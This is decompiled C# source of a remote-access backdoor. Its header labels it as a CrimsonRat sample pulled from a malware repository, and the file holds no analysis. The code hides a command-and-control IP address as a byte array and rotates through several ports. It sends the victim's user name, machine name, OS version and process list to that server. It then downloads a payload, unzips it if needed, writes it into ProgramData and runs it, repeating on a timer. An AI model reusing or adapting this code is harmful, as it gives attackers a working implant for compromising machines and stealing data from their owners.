// Decompiled with JetBrains decompiler
// Type: vabihiudo.MAIMN
// Assembly: vabihiudo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2B84B247-6C9F-4ED5-AF93-3E53B357A8DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Backdoor.MSIL.CrimsonRat.gen-477147271a54e32ef184030393f17c30d68d4aeb8bd6202a225e354f1800b279.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace vabihiudo
{
  internal class MAIMN
  {
    private NetworkStream mediahubsdatStream;
    private int mediahubsbufSize;
    private int mediahubsbytRead;
    public static byte[] ips = new byte[14]
    {
      (byte) 54,
      (byte) 54,
      (byte) 46,
      (byte) 49,
      (byte) 53,
      (byte) 52,
      (byte) 46,
      (byte) 49,
      (byte) 49,
      (byte) 50,
      (byte) 46,
      (byte) 50,
      (byte) 53,
      (byte) 49
    };
    public static int[] ports = new int[5]
    {
      5235,
      8456,
      14814,
      18684,
      20218
    };
    public static int aport;
    private string mediahubsavs;
    public string mainApp;
    public string appPath;
    public string thnApp;
    public string thnPath;
    public string appVer;
    public string werim_zirsa_id;
    public int port_sn;
    public string excPath;
    private SAOVC StateObj;
    public bool mediahubsiswitch;
    public TcpClient mediahubssysSCK;
    public bool isconnected;
    public bool keybord;

    public MAIMN()
    {
      this.mediahubsbufSize = 1024;
      this.mediahubsbytRead = 0;
      this.mediahubsavs = "";
      this.mainApp = "athvindaur|mediahubs".Split('|')[0];
      this.appPath = "\\Paints\\|mediahubs".Split('|')[0];
      this.thnApp = "vabihiudo|mediahubs".Split('|')[0];
      this.thnPath = "\\Saferi\\|mediahubs".Split('|')[0];
      this.appVer = "BDR-001|mediahubs".Split('|')[0];
      this.werim_zirsa_id = "ud_|mediahubs".Split('|')[0];
      this.port_sn = 0;
      this.StateObj = new SAOVC();
      this.mediahubsiswitch = false;
      this.isconnected = false;
      this.keybord = false;
    }

    public string mediahubsloadAV()
    {
      string str1 = "";
      string str2;
      try
      {
        Process[] processes = Process.GetProcesses();
        int num = checked (processes.Length - 1);
        int index = 0;
        while (index <= num)
        {
          str1 = str1 + "#" + processes[index].ProcessName.ToLower();
          checked { ++index; }
        }
        str2 = str1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str2 = str1;
        ProjectData.ClearProjectError();
      }
      return str2;
    }

    public string mediahubsget_coevnd()
    {
      string str;
      try
      {
        if (Operators.CompareString(this.mediahubsavs, "", false) == 0)
          this.mediahubsavs = this.mediahubsloadAV();
        this.mediahubsmore_data("entrme=" + this.appVer + " | " + Environment.UserName + "   |   " + Environment.MachineName + "   |  " + this.mediahubsoname() + " | " + this.mediahubsavs);
        byte[] buffer = new byte[5];
        this.mediahubsbytRead = this.mediahubsdatStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[checked (int32 - 1 + 1)];
        int offset = 0;
        int num = int32;
        while (num > 0)
        {
          int size = num > this.mediahubsbufSize ? this.mediahubsbufSize : num;
          this.mediahubsbytRead = this.mediahubsdatStream.Read(numArray, offset, size);
          checked { offset += this.mediahubsbytRead; }
          checked { num -= this.mediahubsbytRead; }
        }
        str = Encoding.UTF8.GetString(numArray, 0, int32).ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = (string) null;
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public void undror(string sur_file, string dis_ptath)
    {
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(System.Type.GetTypeFromProgID("Shell.Application")));
        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (System.Type) null, "NameSpace", new object[1]
        {
          (object) dis_ptath
        }, (string[]) null, (System.Type[]) null, (bool[]) null)), (System.Type) null, "CopyHere", new object[2]
        {
          RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (System.Type) null, "NameSpace", new object[1]
          {
            (object) sur_file
          }, (string[]) null, (System.Type[]) null, (bool[]) null)), (System.Type) null, "Items", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)),
          (object) 4
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        File.Delete(sur_file);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void mediahubsservData(object StateObj) => this.mediahubsErod();

    public string mediahubsget_lpath() => this.mediahubsget_tpath() + Path.GetFileNameWithoutExtension(Application.ExecutablePath);

    public string mediahubsget_mpath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + this.appPath;

    public string mediahubsget_tpath() => Operators.CompareString(this.thnApp.ToLower(), Path.GetFileNameWithoutExtension(Application.ExecutablePath).ToLower(), false) == 0 ? Path.GetDirectoryName(Application.ExecutablePath) + "\\" : Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + this.thnPath;

    public object mediahubsget_app() => (object) (this.mediahubsget_mpath() + this.mainApp + ".e-x-e".Replace("-", ""));

    public object mediahubsget_tapp() => (object) (this.mediahubsget_tpath() + this.thnApp + ".e-x-e".Replace("-", ""));

    public void mediahubsports_switch()
    {
      checked { ++this.port_sn; }
      try
      {
        checked { ++this.port_sn; }
        MAIMN.aport = MAIMN.ports[this.port_sn];
        if (this.port_sn < checked (MAIMN.ports.Length - 1))
          return;
        this.port_sn = 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.port_sn = 0;
        ProjectData.ClearProjectError();
      }
    }

    public string mediahubsoname()
    {
      string str;
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        str = osVersion.Version.Major.ToString() + ">" + osVersion.Version.Minor.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "Windows!mediahubs".Split('!')[0];
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string getBytsString(byte[] data)
    {
      char[] chArray = new char[checked (data.Length - 1 + 1)];
      int num = checked (data.Length - 1);
      int index = 0;
      while (index <= num)
      {
        char ch = Convert.ToChar(data[index]);
        chArray[index] = ch;
        checked { ++index; }
      }
      return new string(chArray);
    }

    public bool mediahubsconnetc()
    {
      bool flag;
      try
      {
        if (!this.isconnected)
        {
          this.mediahubssysSCK = new TcpClient();
          this.mediahubssysSCK.Connect(MAIMN.getBytsString(MAIMN.ips), MAIMN.aport);
          this.mediahubsbufSize = this.mediahubssysSCK.ReceiveBufferSize;
          this.mediahubsdatStream = this.mediahubssysSCK.GetStream();
          this.isconnected = true;
        }
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.mediahubsports_switch();
        this.mediahubsiswitch = false;
        this.isconnected = false;
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private bool mediahubsmore_data(string type)
    {
      bool flag;
      try
      {
        type = type.Insert(3, "4");
        byte[] bytes1 = Encoding.UTF8.GetBytes(type);
        int num1 = 0;
        int num2 = 5;
        byte[] bytes2 = BitConverter.GetBytes(bytes1.Length);
        byte[] buffer = new byte[checked (num2 + bytes1.Length + (num1 - 1) + 1 - 1 + 1)];
        bytes2.CopyTo((Array) buffer, 0);
        bytes1.CopyTo((Array) buffer, 5);
        int offset = 0;
        int length = buffer.Length;
        while (length > 0)
        {
          int size = length > this.mediahubsbufSize ? this.mediahubsbufSize : length;
          this.mediahubsdatStream.Write(buffer, offset, size);
          checked { offset += size; }
          checked { length -= size; }
        }
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private byte[] mediahubshaveData()
    {
      byte[] numArray;
      try
      {
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.mediahubsbytRead = this.mediahubsdatStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[checked (int32 - 1 + 1)];
        int num = int32;
        while (num > 0)
        {
          int size = num > this.mediahubsbufSize ? this.mediahubsbufSize : num;
          this.mediahubsbytRead = this.mediahubsdatStream.Read(buffer2, offset, size);
          checked { offset += this.mediahubsbytRead; }
          checked { num -= this.mediahubsbytRead; }
        }
        numArray = buffer2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray = (byte[]) null;
        ProjectData.ClearProjectError();
      }
      return numArray;
    }

    private void mediahubsupdate_logs(string switchType)
    {
      try
      {
        string[] strArray = switchType.Split('|');
        if (!Directory.Exists(this.mediahubsget_tpath()))
          Directory.CreateDirectory(this.mediahubsget_tpath());
        if (strArray.Length <= 1)
          return;
        this.mainApp = strArray[0];
        this.appPath = strArray[1];
        File.WriteAllText(this.mediahubsget_lpath(), switchType);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void meriw_azisread_logs()
    {
      try
      {
        if (!File.Exists(this.mediahubsget_lpath()))
          return;
        string[] strArray = File.ReadAllText(this.mediahubsget_lpath()).Trim().Split('|');
        if (strArray.Length > 1)
        {
          this.mainApp = strArray[0];
          this.appPath = strArray[1];
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public bool mediahubsis_there() => File.Exists(Conversions.ToString(this.mediahubsget_app())) & Process.GetProcessesByName(this.mainApp).Length > 0;

    public void mediahubsErod()
    {
      try
      {
        if (!this.mediahubsiswitch && this.mediahubsconnetc() && !this.mediahubsis_there())
        {
          this.mediahubsiswitch = true;
          string[] strArray = this.mediahubsget_coevnd().Split('=');
          string lower = strArray[0].ToLower();
          if (lower.Split('-').Length > 1)
            lower = lower.Split('-')[1];
          string Left1 = lower.Remove(3, 1);
          string Left2 = Left1;
          if (Operators.CompareString(Left2, "inufo", false) == 0)
          {
            this.mediahubsiswitch = false;
            this.mediahubsErod();
          }
          else if (Operators.CompareString(Left2, "entrme", false) == 0 || Operators.CompareString(Left2, "entrmezi", false) == 0)
          {
            this.mediahubsupdate_logs(strArray[1]);
            try
            {
              if (!Directory.Exists(this.mediahubsget_mpath()))
                Directory.CreateDirectory(this.mediahubsget_mpath());
              byte[] bytes = this.mediahubshaveData();
              if (bytes != null)
              {
                if (!File.Exists(Conversions.ToString(this.mediahubsget_app())))
                {
                  if (Operators.CompareString(Left1, "entrmezi", false) == 0)
                  {
                    File.WriteAllBytes(this.mediahubsget_mpath() + this.mainApp + "-data.z,i,p".Replace(",", ""), bytes);
                    this.undror(this.mediahubsget_mpath() + this.mainApp + "-data.z,i,p".Replace(",", ""), this.mediahubsget_mpath());
                  }
                  else
                    File.WriteAllBytes(Conversions.ToString(this.mediahubsget_app()), bytes);
                  Thread.Sleep(5110);
                  this.load_pro();
                }
                else if (Process.GetProcessesByName(this.mainApp).Length == 0)
                  this.load_pro();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          this.mediahubsiswitch = false;
        }
        else
        {
          if (Process.GetProcessesByName(this.mainApp).Length != 0)
            return;
          this.load_pro();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.isconnected = false;
        this.mediahubsiswitch = false;
        ProjectData.ClearProjectError();
      }
    }

    private void load_pro()
    {
      try
      {
        new Process()
        {
          StartInfo = {
            FileName = Conversions.ToString(this.mediahubsget_app())
          }
        }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void mediahubsloadstart()
    {
      try
      {
        MAIMN.aport = MAIMN.ports[0];
        this.StateObj.timer = new System.Threading.Timer(new TimerCallback(this.mediahubsservData), (object) this.StateObj, 24010, 81500);
        Thread.Sleep(1500);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
